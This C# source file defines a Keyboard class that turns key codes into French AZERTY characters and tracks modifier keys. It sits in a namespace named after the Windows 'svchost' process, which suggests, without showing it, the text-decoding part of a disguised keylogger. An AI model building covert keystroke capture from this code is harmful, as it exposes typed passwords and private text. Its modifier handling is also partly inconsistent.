using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Svchost.TextHandling
{
    class Keyboard
    {
        private bool capsLockPressed = false;
        private bool shiftPressed = false;
        private bool ctrlPressed = false;
        private bool altPressed = false;

        private Dictionary<Keys, KeyLayout> keysStrings;

        public Keyboard()
        {
            keysStrings = new Dictionary<Keys, KeyLayout>();

            keysStrings.Add(Keys.Space, new KeyLayout(" ", " "));
            keysStrings.Add(Keys.F5, new KeyLayout("", ""));

            keysStrings.Add(Keys.Return, new KeyLayout("", ""));
            keysStrings.Add(Keys.Back, new KeyLayout("", ""));
            keysStrings.Add(Keys.End, new KeyLayout("", ""));
            keysStrings.Add(Keys.Up, new KeyLayout("", ""));
            keysStrings.Add(Keys.Down, new KeyLayout("", ""));
            keysStrings.Add(Keys.Left, new KeyLayout("", ""));
            keysStrings.Add(Keys.Right, new KeyLayout("", ""));

            keysStrings.Add(Keys.Multiply, new KeyLayout("*", "*"));
            keysStrings.Add(Keys.Divide, new KeyLayout("/", "/"));
            keysStrings.Add(Keys.Add, new KeyLayout("+", "+"));

            keysStrings.Add(Keys.D1, new KeyLayout("&", "1"));
            keysStrings.Add(Keys.D2, new KeyLayout("é", "2"));
            keysStrings.Add(Keys.D3, new KeyLayout("\"", "3", "#"));
            keysStrings.Add(Keys.D4, new KeyLayout("'", "4", "{"));
            keysStrings.Add(Keys.D5, new KeyLayout("(", "5", "["));
            keysStrings.Add(Keys.D6, new KeyLayout("-", "6", "|"));
            keysStrings.Add(Keys.D7, new KeyLayout("è", "7", "`"));
            keysStrings.Add(Keys.D8, new KeyLayout("_", "8", "\\"));
            keysStrings.Add(Keys.D9, new KeyLayout("ç", "9", "^"));
            keysStrings.Add(Keys.D0, new KeyLayout("à", "0", "@"));
           
            keysStrings.Add(Keys.OemMinus, new KeyLayout("-", "-"));
            keysStrings.Add(Keys.Oemplus, new KeyLayout("=", "+"));
            keysStrings.Add(Keys.Oemcomma, new KeyLayout(",", "?"));
            keysStrings.Add(Keys.OemPeriod, new KeyLayout(";", "."));
            keysStrings.Add(Keys.OemQuestion, new KeyLayout(":", "/"));
            keysStrings.Add(Keys.OemOpenBrackets, new KeyLayout(")", "°", "]"));
            keysStrings.Add(Keys.Oem1, new KeyLayout("=", "+"));
            keysStrings.Add(Keys.Oem5, new KeyLayout("*", "µ"));
            keysStrings.Add(Keys.Oem6, new KeyLayout("^", "¨"));
            keysStrings.Add(Keys.Oem8, new KeyLayout("!", "§"));
            keysStrings.Add(Keys.Oemtilde, new KeyLayout("ù", "%"));
            keysStrings.Add(Keys.OemBackslash, new KeyLayout("<", ">"));

            for (Keys numpadIndex = Keys.A; (int)numpadIndex <= (int)Keys.Z; ++numpadIndex)
                keysStrings.Add((Keys)numpadIndex, new KeyLayout(numpadIndex.ToString().ToLower(), numpadIndex.ToString().ToUpper()));

            for (int value = 0, numpadIndex = (int)Keys.NumPad0; numpadIndex <= (int)Keys.NumPad9; ++numpadIndex, ++value)
                keysStrings.Add((Keys)numpadIndex, new KeyLayout(value.ToString(), value.ToString()));
        }

        public string keyActivity(Keys code, bool pressed)
        {
            string result = "";

            if(filterSystemKeys(code, pressed) || !pressed)
            {
                return "";
            }

            result = getString(code);

            return result;
        }

        private string getString(Keys code)
        {
            if (keysStrings.ContainsKey(code))
            {
                if(shiftPressed)
                    return keysStrings[code].ShiftKey;
                else if(altPressed)
                    return keysStrings[code].AltftKey;
                else
                    return keysStrings[code].Key;
            }
            else
                return code.ToString();
        }

        private bool filterSystemKeys(Keys code, bool pressed)
        {
            switch (code)
            {
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.Shift:
                case Keys.ShiftKey:
                    shiftPressed = pressed;
                    return true;
                case Keys.RMenu:
                case Keys.LControlKey:
                    altPressed = pressed;
                    return true;
                case Keys.RControlKey:
                case Keys.Control:
                case Keys.ControlKey:
                    ctrlPressed = pressed;
                    return true;
                case Keys.CapsLock:
                    if (pressed)
                        capsLockPressed = !capsLockPressed;
                    return true;
            }

            return false;
        }
    }
}
